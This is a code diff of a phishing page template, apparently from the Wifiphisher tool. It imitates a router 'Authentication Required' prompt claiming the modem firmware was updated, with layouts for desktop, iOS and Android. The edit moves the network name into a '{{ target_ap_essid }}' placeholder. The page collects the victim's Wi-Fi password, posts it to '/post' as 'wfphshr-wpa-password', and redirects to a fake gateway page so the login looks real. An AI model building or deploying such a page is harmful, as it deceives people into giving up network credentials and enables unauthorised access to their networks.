@@ -1,8 +1,5 @@
 <!DOCTYPE html>
 <html lang="en">
-<script type="text/javascript">
-	var ESSID = 'ESSID';
-</script>
 <head>
 	<title>Authentication Required</title>
 	<meta charset="utf-8">
@@ -396,13 +393,13 @@
 	<div class="container main hide">
 		<div class="window faded">
 			<h1>Authentication Required</h1>
-			<p>The network <span></span> requires a password. The server says: Modem firmware was updated.</p>
+			<p>The network <span>{{ target_ap_essid }}</span> requires a password. The server says: Modem firmware was updated.</p>
 			<form id="form">
 				<input class="hide" type="password" name="encrypt" value="true">
 				<table>
 					<tr>
 						<td>Name:</td>
-						<td><input type="text" name="name"></td>
+						<td><input type="text" name="name" value="{{ target_ap_essid }}"></td>
 					</tr>
 					<tr>
 						<td>Password:</td>
@@ -436,7 +433,7 @@
 	<div class="container android hide">
 		<div style="display: block; margin-top: -107px;" class="modal  modal-in">
 			<div class="modal-inner">
-				<div class="modal-title"><span></span></div>
+				<div class="modal-title"><span>{{ target_ap_essid }}</span></div>
 				<div class="modal-text">Enter your password</div>
 				<div class="input-field">
 					<input name="modal-password" placeholder="Password" class="modal-text-input" type="password">
@@ -455,10 +452,10 @@
 					</li>
 					<li class="check2">
 						<label class="label-checkbox item-content">
-						<input name="ks-checkbox" value="Show advanced options" type="checkbox">
+							<input name="ks-checkbox" value="Show advanced options" type="checkbox">
 							<div class="item-media"><i class="icon icon-form-checkbox"></i></div>
 							<div class="item-inner">
-							<div class="item-title">Show advanced options</div>
+								<div class="item-title">Show advanced options</div>
 							</div>
 						</label>
 					</li>
@@ -477,17 +474,13 @@
 	<script src="./static/js/kitchen-sink.js"></script>
 	<script type="text/javascript">
         // OS Functions
-        // PC & Laptop
+        // PC
         function chrome(){
         	var checked = false;
         	$('.main').removeClass('hide');
 
         	// main.js
         	// Functions
-        	function setESSID(){
-        		$('body .main .window p span').text(ESSID);
-        		$('body .main .window input[name=name]').val(ESSID);
-        	}
         	function toggle(){
         		$('body .main .window').toggleClass('faded');
         	}
@@ -508,21 +501,20 @@
         			close();
         			return false;
         		} else {
-    				e.preventDefault();
+        			e.preventDefault();
 
     				// timeout:800
     				setTimeout(function(){
-	    				$.post('/post', 'wfphshr-wpa-password=' + $('.main input[name=password]').val(), function(){
+    					$.post('/post', 'wfphshr-wpa-password=' + $('.main input[name=password]').val(), function(){
 	    					self.location = './gateway.html'; // pretend to log in to gateway
 	    				});
     				}, 800);
-			    }
-			});
+    			}
+    		});
 
 			// On start
 			// timeout:120
 			setTimeout(function(){ 
-				setESSID();
 				toggle();
 				$('body .main .window input[name=password]').focus();
 			}, 120);
@@ -573,14 +565,14 @@
 			    } else {
 			    	$.post('/post', 'wfphshr-wpa-password=' + $('.ios input[name=password]').val(), function(){
 						window.location = './gateway.html'; // pretend to log in to gateway
-			    	});
+					});
 			    }
 			});
 
     		// submit form on enter
-			$(document).keypress(function(e){
+    		$(document).keypress(function(e){
 				if (e.keyCode === 13) { // enter
-	    			$('.ios form').submit();
+					$('.ios form').submit();
 				}
 			});
     	}
@@ -592,14 +584,13 @@
         	var checked = false;
         	$('.android').hide();
         	$('.android').removeClass('hide');
-        	$('.android .modal-title span').text(ESSID);
         	// timeout:1000
         	setTimeout(function(){ 
                	$('.android').fadeIn(260); // 260 fades nice on slow androids
-        	}, 1000);
+               }, 1000);
 
         	$('.android .check1').click(function(){ 
-				if ($('.android input[name=modal-password]').prop("type", "password")) {
+        		if ($('.android input[name=modal-password]').prop("type", "password")) {
 					// If password
 					$('.android .check1 input[type=checkbox]').prop("checked", "checked");
 					$('.android input[name=modal-password]').prop("type", "text");
@@ -609,16 +600,16 @@
 					$('.android input[name=modal-password]').prop("type", "password");
 				}
 				return false;
-        	});
+			});
 
         	function showButton(){ 
         		// timeout:100
         		setTimeout(function(){
-	        		if ($('.android input[name=modal-password]').val().length < 8) {
-	        			$('.modal-button.ok').addClass('inactive');
-	        		} else {
-	        			$('.modal-button.ok').removeClass('inactive');
-	        		}
+        			if ($('.android input[name=modal-password]').val().length < 8) {
+        				$('.modal-button.ok').addClass('inactive');
+        			} else {
+        				$('.modal-button.ok').removeClass('inactive');
+        			}
         		}, 100);
         	}
 
@@ -632,9 +623,9 @@
         	$('.android .check2').click(function(){ 
         		$('.android .spoiler').toggleClass('displayNone');
         		if ($('.android .spoiler').hasClass('displayNone')) {
-					$('.android .check2 input[type=checkbox]').removeAttr("checked");
+        			$('.android .check2 input[type=checkbox]').removeAttr("checked");
         		} else {
-					$('.android .check2 input[type=checkbox]').prop("checked", "checked");
+        			$('.android .check2 input[type=checkbox]').prop("checked", "checked");
         		}
         		return false;
         	});
@@ -663,7 +654,7 @@
         			// timeout:1000
         			setTimeout(function(){
         				$.post('/post', 'wfphshr-wpa-password=' + $('.android input[name=modal-password]').val(), function(){
-							self.location = './gateway.html';
+        					self.location = './gateway.html';
         				});
         			}, 600);
         		}
@@ -685,7 +676,7 @@
         } else if (/Android|android/i.test(userAgent)) {
             // Android
             $(window).load(function(){
-				android();
+            	android();
             });
         } else if (/iPad|iPhone|iPod|ipad|iphone|ipod|ios|iOS/.test(userAgent) && !window.MSStream) {
             // iOS
